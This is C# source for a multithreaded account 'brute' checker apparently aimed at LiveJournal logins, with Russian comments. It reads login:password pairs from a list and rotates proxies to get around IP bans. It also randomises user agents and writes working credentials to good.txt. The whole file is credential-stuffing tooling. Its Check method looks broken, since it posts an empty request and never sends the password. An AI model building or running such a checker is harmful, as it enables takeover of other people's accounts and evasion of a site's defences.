using System;
using System.Threading;

using xNet.Net;

namespace Engine_Brute
{
    public class Checker
    {

        Thread[] Threads;

        public bool IsWork = false;

        public Object SyncIndex = new Object();
        public Object SyncFiles = new Object();
        public Object SyncProxy = new Object();
        
        public static string Check(string login, string password, int proxyIndex)
        {
            try
            {
                using (var request = new HttpRequest())
                {
                    HttpResponse response;
                    string strResponse;
                  
                    request.Proxy = Helper.GetProxy(proxyIndex);
                    request.AllowAutoRedirect = false;
                    request.Cookies = new CookieDictionary();
                    request.Referer = "http://"+ login +".livejournal.com/";
                    request.UserAgent = HttpHelper.RandomUserAgent();

                    response = request.Post("", "");
                    //cache
                    strResponse = response.ToString();
                    
                    if (strResponse.Contains("302 Found"))
                    {
                        return "good account";  
                    }
                    else if (strResponse.Contains("Your IP address is temporarily banned"))
                    {
                        return "bad proxy";
                    }
                    else if (strResponse.Contains("Incorrect Password."))
                    {
                        return "bad account";  
                    }
                    else
                    {
                        return "bad account";
                    }
                    
                }          
            } 
            catch (Exception)
            {
               return "bad proxy";
            }
        }

        public void CreateThreads()
        {
            globalAccountIndex = -1;
            IsWork = true;
            Threads = new Thread[1000];
		
            for(int i = 0; i < Globals.CountThreads; i++)
            {
                if(i > Globals.Source.Count)
                {
                    break;
                }

                Threads[i] = new Thread(this.Checking);
                Threads[i].IsBackground = true;
                Threads[i].Start();
            }
        }

        public void StopThreads()
        {
            IsWork = false;
        }


        private static int globalAccountIndex = -1;
        private static int globalProxyIndex = -1;

        private void Checking()
        {
            while(IsWork)
            {
                string response = "";
                string[] line;

                int localAccountIndex; //index аккаунта
                int localProxyIndex;   //index прокси
                
                lock (SyncIndex)
                {
                    globalAccountIndex++;
                    localAccountIndex = globalAccountIndex;
                }

                if (localAccountIndex > Globals.Source.Count - 1)
                {
                    IsWork = false;
                    break;
                }

                try
                {
                    //парсинг акка
                    line = Globals.Source[localAccountIndex].ToString().Split(Convert.ToChar(Globals.Delimiter));
           
                }
                catch (Exception)
                {
                    Globals.WorkStatus = "Wrong delimiter";
                    IsWork = false;
                    return;
                }

                do
                {
                    lock (SyncProxy)
                    {
                        globalProxyIndex++;

                        if (globalProxyIndex > Globals.Proxy.Count - 1)
                        {
                            globalProxyIndex = 0;
                        }

                        localProxyIndex = globalProxyIndex;
                    }

                    try
                    {
                        response = Checker.Check(line[0], line[1], localProxyIndex);
                    }
                    catch { }

                } while (response.Contains("bad proxy"));
                
               
                lock (SyncFiles)
                {
                    if (response.Contains("good account"))
                    {
                        // Good

                        Helper.SaveText("good.txt", Globals.Source[localAccountIndex].ToString());
                        Globals.CountGood += 1;

                        if (Globals.SoundOn)
                        {
                            Helper.PlaySound();
                        }

                        SetText(Globals.Source[localAccountIndex].ToString() + Environment.NewLine);
                    }
                    else if (response.Contains("bad account"))
                    {
                        // Bad
                        Helper.SaveText("bad.txt", Globals.Source[localAccountIndex].ToString());
                        Globals.CountBad += 1;

                    }            
                }

                Globals.Pps += 1;

                //Не убирать!!! Иначе пизда форме
                Thread.Sleep(500);
            }    
        }

        //Хуярим текст в основной поток
        private void SetText(string text)
        {
            Program.MyForm.SetText(text);
        }

    }
}
